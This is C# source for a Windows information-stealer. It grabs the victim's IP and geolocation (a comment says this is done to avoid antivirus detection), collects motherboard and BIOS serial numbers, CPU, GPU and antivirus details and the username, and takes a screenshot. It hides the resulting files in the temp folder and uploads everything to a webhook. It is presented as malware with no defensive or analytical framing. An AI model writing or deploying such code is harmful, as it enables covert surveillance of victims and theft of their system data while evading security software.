using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Windows.Forms;

namespace testing1AVE
{
    class Program
    {
        private static readonly string webhook = "";

        static void Main(string[] args)
        {
            try
            {
                var iGlI = "";
                var mBd = "";
                var cpu = "";
                var gpu = "";
                var bios = "";
                var avN = "";

                // Start Of GeoLocation Grabber

                using (var wc = new WebClient())
                {
                    var information = wc.DownloadString("LINK_HERE"); // User Unknown IP Grabber (Easy To Make) To Avoid AV Detections.
                    information = information.Replace("<br>", Environment.NewLine);
                    iGlI = information;
                }

                // End Of GeoLocation Grabber

                // Start Of PC Information Grabber

                foreach (var queryObj in new ManagementObjectSearcher(new SelectQuery("Win32_BaseBoard")).Get())
                    mBd = $"(MB) Serial Number: {queryObj.Properties["SerialNumber"].Value.ToString()}";

                foreach (var managObj in new ManagementClass("win32_processor").GetInstances())
                    cpu = $"(CPU) Name: {managObj.Properties["Name"].Value.ToString()}\n(CPU) Cores: {managObj.Properties["NumberOfCores"].Value.ToString()}";

                using (var searcher = new ManagementObjectSearcher("select * from Win32_VideoController"))
                    foreach (var managObj in searcher.Get())
                        gpu = $"(GPU) Name: {managObj.Properties["Name"].Value.ToString()}\n(GPU) Version: {managObj.Properties["DriverVersion"].Value.ToString()}";

                foreach (var managObj in new ManagementClass("Win32_BIOS").GetInstances())
                    bios = $"Serial Number (BIOS): {managObj.Properties["SerialNumber"].Value.ToString()}";

                using (var searcher = new ManagementObjectSearcher($@"\\{Environment.MachineName}\root\SecurityCenter2", "SELECT * FROM AntivirusProduct"))
                {
                    foreach (var instance in searcher.Get())
                    {
                        instance.GetPropertyValue("displayName");
                        avN = instance.GetPropertyValue("displayName").ToString();
                    }

                    if (avN == "")
                        avN = "N/a";
                }

                // End Of PC Information Grabber

                // Start Of Current Proccess Activities

                var rP = "";
                foreach (var proc in Process.GetProcesses())
                    rP = $"{""}{proc.ProcessName}\n";

                switch (File.Exists($"{Path.GetTempPath()}Proccesses.txt"))
                {
                    case true:
                        File.Delete($"{Path.GetTempPath()}Proccesses.txt");
                        using (var file = new StreamWriter($"{Path.GetTempPath()}Proccesses.txt"))
                            file.WriteLine("");
                        break;
                    default:
                        using (var file = new StreamWriter($"{Path.GetTempPath()}Proccesses.txt"))
                            file.WriteLine("");
                        break;
                }

                if ((File.GetAttributes($"{Path.GetTempPath()}Proccesses.txt") & FileAttributes.Hidden) != FileAttributes.Hidden)
                    File.SetAttributes($"{Path.GetTempPath()}Proccesses.txt", FileAttributes.Hidden);

                // End Of Current Process Activities

                // Start Of Screenshot

                using (var bitmap = new Bitmap(Screen.GetBounds(Point.Empty).Width, Screen.GetBounds(Point.Empty).Height))
                {
                    using (var gfx = Graphics.FromImage(bitmap))
                        gfx.CopyFromScreen(Point.Empty, Point.Empty, Screen.GetBounds(Point.Empty).Size);

                    bitmap.Save($"{Path.GetTempPath()}Screen.jpg", ImageFormat.Jpeg);
                    File.SetAttributes($"{Path.GetTempPath()}Screen.jpg", FileAttributes.Hidden);
                }

                // End Of Screenshot

                // Start Of Sending Information

                using (var wc = new WebClient())
                {
                    wc.UploadValues(webhook, new System.Collections.Specialized.NameValueCollection()
                    {
                        { "username", "Logs" },
                        { "content", $">>> -----GeoLocation Info-----{$"\n{iGlI}\n\n"}-----PC Info-----{$"\n{$"User: {Environment.UserName}"}\n{mBd}\n{cpu}\n{gpu}\n{bios}\n{avN}"}" }
                    });

                    wc.UploadFile(webhook, $"{Path.GetTempPath()}Proccesses.txt");
                    wc.UploadFile(webhook, $"{Path.GetTempPath()}Screen.jpg");
                }
                
                // End Of Sending Information
            }
            catch (Exception ex) { Console.WriteLine($"There was an exception: {ex.Message}"); }

            Console.ReadLine();
        }
    }
}
